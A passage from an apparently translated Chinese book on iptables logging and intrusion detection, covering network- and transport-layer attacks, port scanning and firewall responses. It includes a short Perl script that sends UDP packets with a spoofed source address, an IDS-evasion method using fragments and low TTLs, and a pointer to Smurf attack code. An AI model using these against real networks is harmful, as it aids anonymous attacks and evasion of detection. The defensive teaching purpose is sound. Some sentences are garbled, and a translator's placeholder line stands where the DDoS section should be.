2 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
[iptablesfw]# tail /var/log/messages |grep ICMP |tail -n 1
Apr 14 17:06:45 iptablesfw kernel: DROP INVALID IN=eth1 OUT=
MAC=00:13:46:3a:41:4b:00:a0:cc:28:42:5a:08:00 SRC=192.168.10.200
DST=192.168.10.1 LEN=28 TOS=0x00 PREC=0x00 TTL=64 ID=36520 PROTO=ICMP TYPE=0
CODE=0 ID=44313 SEQ=0
```

***

所有不可路由地址的集定义在 `RFC 1918` 中。按照惯，此类地址在开放的网上是不可路由的。

这里的 *connection* 是 Netfilter 用于对数据包进行分类的跟踪机制。

关于 `iptables.sh` 脚本需要注意的一点是，所有的 `LOG` 规则都是使用 `--log-ip-options` 和 `--log-tcp-options` 参数构建的。使得生成的 iptables syslog 日志在匹配 `LOG` 规则的数据包包含这些选项时，能够包含 IP 和 TCP 头部中的 IP 和 TCP 选项部分。此功能对于攻击检测以及 `psad` 执行的被动操作系统指纹识别操作都很重要。

关于 RST 包是否设置了 ACK 位的细节将在第 3 章中详细讨论。

# 结语

本章重点关注对书中后续内容重要的 iptables 概念，并为从 iptables 角度开始讨论入侵检测和响应奠定了基础。我们现在拥有了默认的 iptables 策略和后续章节中引用的网络拓图，并且已经看到了 iptables 日志消息示例，说明了 iptables 日志格式的完整性。我们现在准备好进入我们可以用 iptables 检测并——正如我们将看到的——还可以阻止的攻击处理中。

# 第 2 章 网络层攻击与防御

网络层——OSI 参考模型中的第三层——是互联网上端到端路由和数据包传输的主要机制。本书主要关注通过 IPv4 网络协议传输的攻击，尽管也存在许多其他网络协议，例如 IPX、X.25 以及潜在的 IPv6 协议。

在本章中，我们将首先关注 iptables 如何在日志消息输出中记录网络层数据包头部。然后我们将看到如何利用这些日志进行捕获。

## 使用 iptables 记录网络层头部

通过 `LOG` 目标，iptables 有能力为 IPv4 头的几乎每个字段写入 syslog。

### 记录 IP 头部

IP 头部由 `RFC 791` 定义，阴框表示 iptables 在其日志中包含的头部字段。例如，总长度字段带有 `LEN=` 前缀，存活时间（TTL）字段带有 `TTL=` 前缀。

深灰色框始终被 iptables 记录。白色框表示未记录的头部字段。中灰色框用于 IP 头的选项部分。该框显示为中灰色是因为只有在向 iptables 策略中添加 `LOG` 规则时使用了 `--log-ip-options` 命令行参数，iptables 才会记录 IP 选项。

这是一个从 `ext_scanner` 系统向 `iptablesfw` 系统发送 ICMP Echo Request 生成的 iptables 日志示例：

``` [ext_scanner]$ ping -c 1 71.157.X.X
PING 71.157.X.X (71.157.X.X) 56(84) bytes of data.
64 bytes from 71.157.X.X: icmp_seq=1 ttl=64 time=0.171 ms

--- 71.157.X.X ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.171/0.171/0.171/0.000 ms
[iptablesfw]# tail /var/log/messages | grep ICMP | tail -n 1
Jul 22 15:01:25 iptablesfw kernel: IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.
X LEN=84 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=ICMP TYPE=8 CODE=0 ID=
44366 SEQ=1
```



上述日志消息中的 IP 头部从源 IP 地址（扩展为标准的点点表示法）开始。额外的 IP 头部字段如目的 IP 地址、`TTL` 值和协议字段以**粗体**显示。服务类型字段（`TOS`）以及 `precedence`（优先级）和相应的 `type`（类型）位作为单独十六进制值包含在 `TOS` 和 `PREC` 字段中。此时，`Flags`头部字段以字符串 `DF` 或 `Don't Fragment`（不分片）的形式包含，这表示不允许 IP 网关将数据包拆分为更小的块。最后，`PROTO` 字段是 IP 头部封装的协议——在本情况下为 ICMP。上述日志消息中的剩余字段包括 `ping` 命令发送的 ICMP 回显请求包中的 ICMP `TYPE`、`CODE`、`ID` 和 `SEQ` 值，它们不属于 IP 头部的一部分。

### 记录 IP 选项

IP 选项为 IP 通信提供了各种控制功能，这些功能包括时间戳、某些安全能力以及特殊路由功能的规定。IP 选项具有可变长度，在互联网上的使用频率较低。如果没有 IP 选项，IP 数据包头部始终正好为 20 字节。要让 `iptables` 记录 IP 部的选项部分，请使用以下命令（注意**粗体**的 `--log-ip-options` 关）：

```
[iptablesfw]# iptables -A INPUT -j LOG --log-ip-options
```

由 `iptables.sh` 脚本构建的策略中的默认 `LOG` 规则均使用 `--log-ip-options` 命令行参数，因为 IP 选项可能包含影响安全的信息。

为了说明包含 IP 选项的 `iptables` 日志消息，我们再次 ping `iptablesfw` 系统，但这次我们指示 `ping` 命令将 `timestamp` 选项设置为 `tsonly`（仅时间戳）：

```
[ext_scanner]$  ping -c 1 -T tsonly 71.157.X.X
PING 71.157.X.X (71.157.X.X) 56(124) bytes of data.
64 bytes from 71.157.X.X icmp_seq=1 ttl=64 time=0.211 ms
TS:     68579524 absolute
        578
        0
        −578
--- 71.157.X.X ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.211/0.211/0.211/0.000 ms
[iptablesfw]# tail /var/log/messages | grep ICMP
Jul 22 15:03:00 iptablesfw kernel: IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=124 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF OPT (44280D00041670C404167306000000
) PROTO=ICMP TYPE=8 CODE=0
ID=57678 SEQ=1
```

上方的粗体部分，字符串 `OPT` 后面跟着一长串十六进制字节。这些字节是 IP 头部中包含的完整 IP 选项，但 `iptables` `LOG` 目标并没有为我们解码它们；我们将使用 `psad` 来理解它们的含义。

### 记录 ICMP

`iptables` `LOG` 目标有专门用于记录 ICMP 代码，由于 ICMP 存在于网络层，我们接下来介绍它。ICMP（由 RFC 792 定义）有一个仅 32 位的简单头部。图 2-2 显示了 ICMP 头部。该头部由三个字段组成：`type`（8 位）、`code`（8 位）和 `checksum`（16 位）；剩余字段是 ICMP 数据包的数据部分。

数据部分中的特定字段取决于 ICMP 的类型和代码值。例如，与 ICMP 回显请求（type 8，code 0）相关的字段包括 `ID` 和序列值。

! ICMP 头部和对应的 iptables 日志消息字段

与 IP 头部一样，`LOG` 目标始终记录 `ICMP` `type` 和 `code` 字段，且绝不记录 ICMP `checksum` 字段。`iptables` 中没有命令行参数可以影响 `LOG` 目标表示 ICMP 数据包数据部分内字段的方式。本章第一个回显请求包中的 ICMP 字段出现在下方的最后一行开始：

```
Jul 22 15:01:25 iptablesfw kernel: IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=124 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=ICMP
TYPE=8 CODE=0
ID=57678 SEQ=1
```

¹ 同样适用于 IPv6 头部，但本书未涵盖 IPv6。

² IP 分片偏移有一个例外——`iptables` 仅在其为非零时进行记录。

³ 这种转换还有其他实例，例如 TCP 标志，我们将在第 3 章介绍。

⁴ 与某些人将 ICMP 归类为 TCP 和 UDP 等传输协议不同，ICMP 被视为网络层协议。参见 W. Richard Stevens *TCP/IP Illustrated, Volume 1* 第 69 页（Addison-Wesley, 1994）。

⁵ 检查 `linux/net4/netfilter/ipt_c` 中第 249 行的 `switch` 语句说明了这一点。

## 网络层攻击定义

我们将网络层攻击定义为：利用网络层头部字段，以利用终端主机网络栈实现中的漏洞、消耗网络层资源或隐藏针对高层攻击的数据包或系列数据包。

网络攻击分为三类：

### 头部滥用

包含恶意构造、损坏或伪造的网络层头部的数据包。包括伪造源地址的 IP 包和包含不合理分片偏移值的包。

### 网络栈利用

包含特殊构造组件的数据，旨在利用终端主机网络栈实现中的漏洞。也就是说，处理网络层信息的代码本身就是目标。一个很好的例子是发现于 Linux 内核（2.6.9 及早期版本）的互联网组管理协议（IGMP）拒绝服务漏洞。

### 带宽饱和

旨在饱和目标网络所有可用带宽的数据包。通过 ICMP 发送的分布式拒绝服务（DDoS）攻击是一个很好的例子。

### 注意

尽管本章重点关注滥用网络层的技术，但重要的是，许多此类技术可以与其他层的攻击结合起来。例如，应用层攻击（例如利用缓冲区溢出漏洞的攻击）可以通过分片 IP 数据包发送，以规避入侵检测系统。在这种情况下，真正的攻击利用了应用层漏洞，但使用名为`分片`的网络层技术进行交付，使得应用层攻击更难检测。




Linux 内核 IGMP 漏洞在常见漏洞与暴露（CVE）数据库中被分配编号为 `CAN-2004-1137`，该数据库是目前最有效的漏洞跟踪机制之一。更多信息请参阅 [`cve.mitre.org/cve`](http://cve.mitre.org/cve)。

## 滥用网络层

网络层将数据包路由到全球各地目的地的能力，提供了攻击全球范围内目标的能力。由于 IPv4 没有任何认证概念（这项工作被交给了 IPSec 协议或更高层的机制），攻击者可以很容易地构造出具有篡改头部或数据的 IP 包，并将其大量发送到网络中。虽然此类数据包在到达预期目标之前，可能会被防火墙或带有访问控制列表（`ACL`）的路由器等在线过滤设备过滤掉，但它们往往并不会过滤。

### Nmap ICMP 探测

当使用 `Nmap` 扫描不在同一子网的系统时，它通过向目标主机的 80 端口发送 `ICMP Echo Request` 和 `TCP ACK` 来执行主机发现。（可以使用 `Nmap` 的 `-P0` 命令行参数禁用主机发现，但它是默认开启的。）`Nmap` 生成的 `ICMP Echo Requests` 与 `ping` 程序生成的 `Echo Requests` 不同之处在于，`Nmap Echo Requests` 不包含 `ICMP` 头之外的任何数据。因此，如果此类数据包被 `iptables` 记录，其 IP 长度字段应为 28（不带选项的 IP 头占 20 字节，加上 8 字节的 `ICMP` 头，加上 0 字节的数据，如加粗所示）：

```
 [ext_scanner]# nmap -sP 71.157.X.X
[iptablesfw]# tail /var/log/messages | grep ICMP
Jul 24 22:29:59 iptablesfw kernel: IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=28 TOS=0x00 PREC=0x00 TTL=48 ID=1739 PROTO=ICMP TYPE=8 CODE=0 ID=15854
SEQ=62292
```

### 注意

`ping` 程序也可以通过 `-s 0` 命令行参数设置载荷大小为零，从而生成不包含应用层的数据包，但默认情况下，`ping` 程序会包含几十字节的载荷数据。

虽然在 `ICMP` 包中不包含应用层数据本身并不算滥用网络层，但如果你看到此类数据包与指示端口扫描或端口扫描等活动的数据包一起出现（参见 第 3 章），那么可以确定有人正在使用 `Nmap` 对你的网络进行侦察。

## IP 欺骗

计算机安全领域中很少有术语比 `spoofing`（欺骗）引起更更多的困惑和夸大，特别是 `IP 欺骗`。`spoof` 是指骗局或恶作剧，而 `IP 欺骗` 意味着故意构造一个带有伪造源地址的 IP 包。

### 注意

我们在这里对 IP 包上更改源地址的网络地址转换（`NAT`）操作做出了例外（例如防火墙通常提供的、用于通过单个外部地址掩蔽内部网络的功能）。不要将其与 `IP 欺骗` 混淆，`NAT` 是合法的网络功能，而用伪造源地址隐藏攻击则不是。

在涉及 IP 通信时，数据包的源地址没有内置限制。通过使用原始套字（raw socket，一种根据特定标准构造数据包的低级编程 API），可以发送任意源地址的 IP 包。如果源地址在本地网络上下文中是没有意义的（例如，如果源地址是 Verizon 网络上的一个 IP，但数据包实际上是从 Comcast 网络发送的），则该数据包被称为被“欺骗”。管理员可以采取措施配置路由器和防火墙，使其不转发源地址在内部网络范围之外的数据包（这样欺骗包永远无法出去），但许多网络没有此类控制。在 第 1 章 中讨论的默认 `iptables` 策略内置了反欺骗规则。

从安全角度来看，关于欺骗包（以及泛指 IP 包）最重要的的一点是：无法信任源地址。事实上，有时一个完整的攻击可以通过单个欺骗包投送（参见 第 8 章 中关于 Witty 虫的讨论）。

### 注意

任何带有欺骗源地址的数据包纯粹是“发出去就不不管”，因为目标对数据包的任何响应都将定向回那个伪造的欺骗地址。尽管如此，也可以从中获得慰藉：任何需要双向流量的协议（如传输层的 `TCP`）都无法在欺骗的 IP 地址上运行。

许多安全软件（包括攻击性和防御性的）都包含欺骗源 IP 地址的能力。分布式拒绝服务（DDoS）工具通常认为欺骗是必要的，像 `hping` 这样的知名工具就可以欺骗源地址。使用 `hping` 等工具或使用自己的工具来构造带有欺骗源地址的数据包轻而易举。以下是一个简单的 Perl 代码段，用于构建带有欺骗源地址的 UDP 数据报文。该脚本使用了 `Net::RawIP` 模块：

```perl
#!/usr/bin/perl -w

use Net::RawIP;
use strict;
my $src = $ARGV[0] or &usage();
my $dst = $ARGV[1] or &usage();
my $str = $ARGV[2] or &usage();

my $rawpkt = new Net::RawIP({
    ip => {
        saddr => $src,
        daddr => $dst
    },
    udp => {
        source => 10001,
        dest   => 53,
        data   => $str,
    }
});
$rawpkt->send();
print '[+] Sent ' . length($str) . " bytes of data...\n";
exit 0;

sub usage() {
    die "usage: $0 <src> <dst> <str>";
}
```

## IP 分片

将 IP 包拆分为一系列较小数据包的能力是 IP 的基本功能。拆分 IP 包的过程被称为 `分片`（fragmentation），每当 IP 包路由到数据链路 MTU 大小小以容纳该数据包的网络时，这种过程就是必要的。任何连接不同 MTU 大小数据链路的路由器都有责任确保从一个数据链路传输到另一个数据链路的 IP 包不会超过 MTU。目标主机的 IP 栈会重组分片以创建原始包，此时数据包内部封装的协议将向上层栈传递给下一层。

攻击者可以利用 IP 分片作为 IDS 规避机制，通过构造攻击并刻意将其拆分到多个 IP 分片中。任何完整实现的 IP 栈都能重组分片流量，但为了检测攻击，IDS 也必须使用与目标 IP 栈相同的算法来重组流量。由于不同的 IP 栈实现重组算法略有不同（例如对于重复分片，Cisco IOS IP 栈根据最后一个分片策略重组流量，而 Windows XP 栈根据第一个分片策略重组），这给 IDS 带来了挑战。生成分片流量的金标准是 Dug Song 的 `fragroute` 工具（参见 [`www.monkey.org`](http://www.monkey.org)）。

## 低 TTL 值




任何 IP 路由器在每次将 IP 数据包转发到另一个系统时，都应该将 IP 报头中的 `TTL` 值减 1。如果你的本地子网内出现了 `TTL` 为 1 的数据包，那么很可能有人在使用 `traceroute` 程序（或其变体，如 `tcptraceroute`）针对一个存在于本地子网或通过本地子网路由的子网中的 IP 地址进行操作。通常这只是某人在排查网络连接性问题，但也可能是有人正在对你的网络进行侦察，以绘制通往潜在目标的跳数映射。

### 注意

目标为组播地址（根据 `RFC 1112` 定义的 `224.0.0.0` 到 `239.255.255.255` 范围内的所有地址）的数据包其 `TTL` 值通常设置为 1。因此，如果目标地址是组播地址，那么此类流量可能与 `traceroute` 的网络映射尝试无关，而只是合法的组播流量。

`traceroute` 产生的 UDP 数据包被 `iptables` 记录如下（注意加粗的 `TTL`）：

```
 Jul 24 01:10:55 iptablesfw kernel: DROP IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:13:46:c2:60:44:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=40 TOS=0x00 PREC=0x00 TTL=1 ID=44081 PROTO=UDP SPT=54522 DPT=33438 LEN=20
```

使用分片和目标 TTL 隐藏攻击

路由路径信息对于利用分片重组技巧隐藏网络攻击非常有用。例如，假设攻击者看到主机主机前面有一个路由器（通过 `traceroute` 确定），并且攻击者怀疑一个 `IDS` 正在监控主机子网之前的子网。如果是这种情况，可以针对主机进行攻击，将攻击分分为三个 IP 数据包（我们称其为 `f1`、`f2` 和 `f3`），但其方式要使 `IDS` 无法检测。攻击者可以通过创建第二个分片（`f2`）的副本，将其负载替换为虚假数据，并将 `TTL` 减少到一个初始值，该值恰好让数据包到达路由器时 `TTL` 为 1。我们将此数据包称为 `f2'`。接下来，攻击者发送第一个分片（`f1`），接着是这个新分片（`f2'`），然后是 `f3`，最后是原始的 `f2` 分片。因此，`IDS`（位于路由器前面）看到了所有的四个分片，但 `f3` 完成了分片集，因此 `IDS` 将它们重组为 `f1 + f2' + f3`。

由于 `f2'` 包含虚假数据，因此这三个分片在 `IDS` 看来并不像攻击。同时，`f2'` 命中路由器并被丢弃，因为它的 `TTL` 值在转发之前被减到了 0，所以目标 IP 地址从未见过 `f2'`。然而，主机看到了分片 `f1` 和 `f3`，但在没有原始 `f2` 的情况下，它无法将它们重组为任何有意义的内容，因此会等待。

当 `f2` 最终到达时（记住攻击者是最后发送它的），目标主机在最终重组所有三个分片后遭受了真实的攻击。这项技术最早由 Vern Paxson 在《Bro: A System for Detecting Network Intruders in Real-Time》中提出（参见 [`www.icir.org/vern/papers/bro-cn99.html`](http://www.icir.org/vern/papers/bro-cn99.html)）；它提供利用网络层向网络入侵检测系统隐藏攻击的巧妙方法。

### 注意

本地子网上任何数据包的另一个可疑 `TTL` 值是 0。这种数据包只有在存在严重错误的路由器将数据包转发到子网，或者数据包源自同一子网上的某个系统时才可能存在。

## Smurf 攻击

Smurf 攻击是一种老旧但优雅的技术，攻击者向网络广播地址伪造 `ICMP Echo Requests`。伪造的地址是预定目标，目标是尽可能通过响应广播地址上 `Echo Requests` 的系统向目标泛洪尽可能多的 `ICMP Echo Response` 数据包。如果网络运行时没有针对这些指向广播地址的 `ICMP Echo Requests` 的控制（例如在 Cisco 路由器上使用 `no ip directed-broadcast` 命令），则所有接收到 `Echo Requests` 的主机都会对伪造源地址响应。通过使用大型网络的广播地址，攻击者希望放大针对目标生成的包数量。

与带有专用通道且没有简单路由器配置防御措施的 DDoS 攻击工具（下文讨论）相比，Smurf 攻击已经过时。但它仍然值得提及，因为 Smurf 攻击非常容易执行，且原始代码 easily 可用（参见 [`www.phreak.org/archives/exploits/denial/smurf.c`](http://www.phreak.org/archives/exploits/denial/smurf.c)）。

## DDoS 攻击

（此处为原文重复的描述性文本，已按要求处理翻译逻辑）





⁷ 成功的 TCP 序列预测攻击可以导致 TCP 连接断开，或从伪造的源向现有连接注入数据。

⁸ 以主机为中心的入侵检测方法被称为基于目标的入侵检测（target-based intrusion detection），它允许入侵检测系统（IDS）考虑目标系统的实现细节；更多信息请参见第 8 章。

⁹ 如果路由器在转发数据包之前持有的时间超过一秒，则可能会将 `TTL` 值减 2 或更多。`RFC 791` 规定路由器必须将 `TTL` 至少减 1。

## 网络层响应

对网络层响应的定义达成共识与网络层攻击的定义同样有用。因为此类响应不应涉及位于传输层或更高层的信息，因此我们仅限于通过三种方式对网络层头部进行操作：

*   由防火墙或路由器等设备执行的过滤操作，以拦截攻击者的源 IP 地址
*   重新配置路由协议，通过路由黑洞（route blackholing）拒绝攻击者将数据包路由到预期目标的能力——数据包被发送到虚空且永无音讯
*   根据利用的带宽对允许通过防火墙或路由器的流量大小应用阈值逻辑

纯处于网络层的 `response`（响应）可用于对抗在应用层检测到的攻击，但此类响应不应涉及诸如生成 `TCP RST` 数据包等操作例如这属于传输层响应，正如我们在第 3 章中所看到的。

## 网络层过滤响应

在从特定 IP 地址检测到攻击后，可以使用以下 `iptables` 规则作为属于过滤类的网络层响应。这些规则被添加到 `INPUT`、`OUTPUT` 和 `FORWARD` 链中；它们会拦截所有（无论协议或端口）指向或来自 IP 地址 `144.202.*X.*.*X` 的通信：

```
[iptablesfw]# iptables -I INPUT 1 -s 144.202.X.X -j DROP
[iptablesfw]# iptables -I OUTPUT 1 -d 144.202.X.X -j DROP
[iptablesfw]# iptables -I FORWARD 1 -s 144.202.X.X -j DROP
[iptablesfw]# iptables -I FORWARD 1 -d 144.202.X.X -j DROP
```

`FORWARD` 链中有两条规则用于拦截源自 `144.202.*X.*.*X`（`-s 144.202.*X.*.*X`）的数据包，以及指向 `144.202.*X.*.*X` 的内部系统响应（`-d 144.202.*X.*.*X`）。如果你使用 `iptables` 作为网络哨兵，上述规则为针对 `144.202.*X.*.*X` 地址提供了一个有效的网络节点。

## 网络层阈值响应

对 `iptables` 目标应用阈值逻辑是通过 `iptables` `limit` 扩展实现的。例如，可以在 `ACCEPT` 规则中使用 `limit` 扩展，以限制在给定窗口内从特定源地址接受的数据包数量。以下 `iptables` 规则限制策略为每秒仅接受指向或来自 `144.202.*X.*.*X` IP 地址的 10 个数据包。

```
[iptablesfw]# iptables -I INPUT 1 -m limit --limit 10/sec -s 144.202.X.X -j ACCEPT
[iptablesfw]# iptables -I INPUT 2 -s 144.202.X.X -j DROP
[iptablesfw]# iptables -I OUTPUT 1 -m limit --limit 10/sec -d 144.202.X.X -j ACCEPT
[iptablesfw]# iptables -I OUTPUT 2 -d 144.202.X.X -j DROP
[iptablesfw]# iptables -I FORWARD 1 -m limit --limit 10/sec -s 144.202.X.X -j ACCEPT
[iptablesfw]# iptables -I FORWARD 2 -s 144.202.X.X -j DROP
[iptablesfw]# iptables -I FORWARD 1 -m limit --limit 10/sec -d 144.202.X.X -j ACCEPT
[iptablesfw]# iptables -I FORWARD 2 -d 144.202.X.X -j DROP
```

对于上述每个使用 `limit` 匹配的 `ACCEPT` 规则，都有一个对应的 `DROP` 规则。这处理了超过 `limit` 匹配允许的最大每秒 10 个的数据包水平；一旦数据包水平高于此阈值，它们将不再匹配 `ACCEPT` 规则，然后将与 `iptables` 策略中的剩余规则进行比较。通常情况下，与其允许经过阈值限制的数据包通过，不如完全拒绝与攻击者通信更好。

你还可以使用 `limit` 匹配对默认日志规则生成的 `iptables` 日志消息设置阈值。然而，除非担心磁盘空间，否则通常没有对 `LOG` 规则应用限制阈值，因为内核在 `LOG` 目标内部使用环形缓冲区，因此当数据包击中 `LOG` 规则的速度超过其通过 `syslog` 写入的速度时，日志消息就会被覆盖。




相比之下，UDP 是一种无连接协议。作为一种无连接协议，它无法保证数据一定到达其预期的目的地，无法对实际传输的数据格式提供保证（与 TCP 不同，UDP 头部中的校验和计算是可选的）。通过 UDP 套接字传输数据的应用程序可以选择实现额外的机制来可靠地传输数据，但在使用 UDP 套接字时，此类功能必须在应用层构建。

在本章中，我们首先关注 `iptables` 如何在日志消息输出中表示传输层信息。然后我们将查看这些日志如何捕获可疑的传输层活动。

# 使用 iptables 记录传输层头部

`iptables` 的 `LOG` 目标具有丰富的机制来记录 TCP 和 UDP 头部。TCP 头部比 UDP 头部复杂得多，并且只有在向 `iptables` 策略中添加 `LOG` 规则时提供了特定的命令行参数 的情况下，某些 TCP 头部字段才会被记录。

## 记录 TCP 头部

TCP 头部定义在 RFC 793 中，任何特定 TCP 段的头部长度取决于所包含的选项数量。不包含选项（这是唯一的变长字段）时，头部长度始终为 20 字节。在 `iptables` 日志消息中，TCP 头部的每个字段都以一个标识字符串开头，如图 3-1 所示。

![TCP 头部和 iptables 日志消息字段](img/httpatomoreillycomsourcenostarchimages207394.png)

图 3-1. TCP 头部和 iptables 日志消息字段

图 3-1 中的所有深灰色框始终包含在 TCP 数据包的 `iptables` 日志消息中；浅灰色阴影的字段仅在给 `iptables` 提供指定的命令行参数时才会被包含。白色框永远不会被 `iptables` 记录。

第 1 章 中默认 `iptables` 策略包含的 `INPUT`、`OUTPUT` 和 `FORWARD` 链中的 `LOG` 规则都是使用 `--log-tcp-options` 参数构建的，因此只要 TCP 段包含选项，每条日志消息都会包含一段十六进制代码。本章假设来自第 1 章 的 `iptables.sh` 脚本实现的默认 `iptables` 策略运行在图 3-2 所示的 `iptablesfw` 系统上。（此图与图 1-2 相同，为了方便起见在此处重复。）

![默认网络图](img/httpatomoreillycomsourcenostarchimages207418.png)

图 3-2. 默认网络图

为了说明 `iptables` 日志消息中包含的 TCP 选项，我们尝试从 `ext_scanner` 系统向 `iptablesfw` 系统发起到端口 15104 的 TCP 连接。

由于默认策略不允许与端口 15104 通信，初始 SYN 包被默认的 `iptables` `LOG` 和 `DROP` 规则拦截。`iptables` 与 TCP 头部每个字段关联的标记在下方加粗显示，从源端口（`SPT`）开始，到头部的选项部分（`OPT`）结束：

```
 [ext_scanner]$ nc -v 71.157.X 15104
[iptablesfw]# tail /var/log/messages | grep 15104
Jul 12 15:10:22 iptablesfw kernel: DROP IN=eth0 OUT
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X
LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=18723 DF=TCP
SPT=47454 DPT=15104 WINDOW=5840 RES=0x00 SYN URGP=0 OPT20405B040208A30
```

要让 `iptables`  TCP 序列和确认值，使用 `--log-tcp-sequence` 参数（见下文节）：

```
 [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 15104 -j LOG --log-tcp-options --log-tcp-sequence
[ext_scanner]$ nc -v 71.157.X 15104
[iptablesfw]# tail /var/log/messages | grep 15104
Jul 12 15:33:53 iptablesfw kernel: IN=eth0 OUT
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X
LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=62378 DF=TCP
SPT=54133 DPT=15104
SEQ=318089345 ACK=0 WINDOW=5840 RES=0x00 SYN URGP=0 OPT20405B040208A30876A10000000103006
```

## 记录 UDP 头部

UDP 头部定义在 RFC 768 中，它是 8 字节且没有字段（见图 3-3）。由于没有特殊的命令行参数来影响 `LOG` 目标对 UDP 头部的表示方式，`iptables` 总是以相同的方式记录。

![UDP 头部和 iptables 日志消息字段](img/httpatomoreillycomsourcenostarchimages207432.png)

图 3-3. UDP 头部和 iptables 日志消息字段

尽管第 1 章 中讨论的 `iptables` 策略使用了 `--log-tcp-options` 参数，但如果 UDP 包命中这些规则之一，`iptables` 会正确处理并不记录不存在的 TCP 头部部分。UDP 校验和永远不会记录，但其余三个字段（`SPT`、`DPT` 和 `LEN`）都会包含在内：

```
 [ext_scanner]$ echo -n "aaaa" | nc -u 71.157.X 5001
[iptablesfw]# tail /var/log/messages | grep 5001
Jul 12 16:27:08 iptablesfw kernel: DROP IN=eth0 OUT
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X
LEN=33 TOS=0x00 PREC=0x00 TTL=64 ID=38817 DF=UDP
SPT=44595 DPT=5001 LEN=12
```

### 注意

上述 `iptables` 日志消息中的 UDP `LEN` 字段包含了头部长度加上应用层数据的长度。在本例中，应用层数据由四个字节 `"aaaa"` 组成，因此与 UDP 头部（8 字节）相加得到 12 字节。`echo` 命令的命令行参数 `-n` 指示不要添加尾换行符。如果没有使用该参数，`LEN` 字段的值将变为 13 以适应额外的字节。

***

¹ 从技术上说，传输层在 OSI 模型中与上面的会话层和下面的网络层交互，但通常将会话层包含在应用层中（以及表示层）更有用。

² 虽然 TCP 信息的单元术语是 TCP *段*，但很多人非正式地称为 TCP *包*（*包* 在技术上是留给网络层的术语），我也使用这种口语化表达。相同的逻辑适用于 UDP *数据报*。

# 传输层攻击定义

类似于第 2 章 中网络层攻击的定义，我们将*传输层攻击*定义为滥用传输层头部字段以利用终点主机传输栈实现中的漏洞或错误状态的数据包或系列包。

**连接资源耗尽**

旨在饱和目标主机或主机组用于处理新连接的所有可用资源的包。一个例子是 SYN 泛洪形式的 DDoS 攻击。

**头部滥用**




包含恶意构建、损坏或伪造的传输层报头部的数据包。一个很好的例子是伪造的 `RST` 数据包，设计用于断开 TCP 连接。我们将端口扫描（下文将讨论）也归入此类，尽管扫描行为`by itself` 并不恶意。

### 传输协议栈漏洞利用

包含针对终端主机堆栈漏洞的传输层堆栈漏洞利用程序的数据包。也就是说，专门用于处理传输层信息的内核代码本身就是攻击目标。一个很好的例子（特别是在本书的语境下）是 2004 年公布针对 `Netfilter` TCP 选项处理代码漏洞的利用程序（该漏洞已被 `Netfilter` 项目快速修复，因此任何较新版本的内核都不受该漏洞影响）。虽然这并没有利用 TCP 栈本身，但它利用了通过 `Netfilter` 框架直接挂钩到堆栈上的代码。

# 滥用传输层

由于传输层在某种意义上是与网络应用程序进行堆栈向上通信之前的最后一道网关，因此它对攻击者来说是一个极具吸引的目标。许多涉及传输层信息的可疑活动属于侦察工作，而不是直接攻击。

### 端口扫描

端口扫描是一种用于查询主机的技术，以查看从特定 IP 地址可以访问哪些 TCP 或 UDP 服务。扫描系统可以是通往成功破解过程中的重要一步，因为这为攻击者提供了有关可能被访问和攻击的服务信息。

尽管如此，端口扫描也可以是查看哪些可用服务通信的重要步骤；端口扫描行为`by itself` 并不具有本质的恶意性。你可以将端口扫描比作一个人敲某栋房子所有的门。对于任何给定的门，如果有人开门，那人只是说“你好，很高兴见到你”，然后离开，并没有造成任何伤害。虽然重复敲门可能很可疑，除非此人试图进入房屋，否则可能没有构成犯罪。尽管如此，如果有人敲了我`my`房子的所有门，我还是想知道这件事，因为这可能标志着有人正在收集关于最佳入入方式的信息。同样，检测端口扫描是一个好主意（需经过调优以减少误报），且大多数网络入侵检测系统（IDS）都提供在系统受到扫描攻击时发送警报的能力。

### 将端口扫描与易受攻击性服务进行匹配

端口扫描不需要对目标系统上的每个可能的端口进行详尽测试。如果攻击者擅长攻破例如 `OpenSSH 3.3` 和 `BIND 4.9` 服务器，那么发现其余 65,533 个端口是否也绑定了服务器的用处不大。此外，生成一个嘈杂的扫描来测试系统上的所有端口是触发 IDS 警报的好方法，因为任何合理的端口扫描阈值都更有可能被触发。作为攻击者，最好不要引起不必要的注意。为了让 IDS 更难确定扫描的真实源，攻击者还可以使用 `Nmap` 的诱饵（`-D`）选项。这允许端口扫描从几个伪造的源地址进行复制，因此在目标系统看来，它似乎正在同时被几个独立源进行扫描。目标是让任何可能监控 IDS 警报的安全管理员更难查出扫描的真实源。

### TCP 端口扫描技术

TCP 端口扫描可以使用数量惊人的技术来完成。每种技术在数据包穿越网络时，在链路上看起来都略有不同，我们接下来的几节（从 `TCP connect() Scans` 开始，到第 58 页的 `TCP Idle Scans` 结束）将专门说明主要的扫描技术。幸运的是，无与伦比的 `Nmap` 扫描器（见 `http://www.insecure.org`）已经为我们自动化了每种技术，我们在本章所有的扫描示例均使用了 `Nmap`。我们在激活了默认 `iptables` 策略的情况下对 `iptablesfw` 系统启动扫描，并将讨论下面列出的 `Nmap` 端口扫描技术：

*   TCP `connect()` 扫描——(Nmap `-sT`)
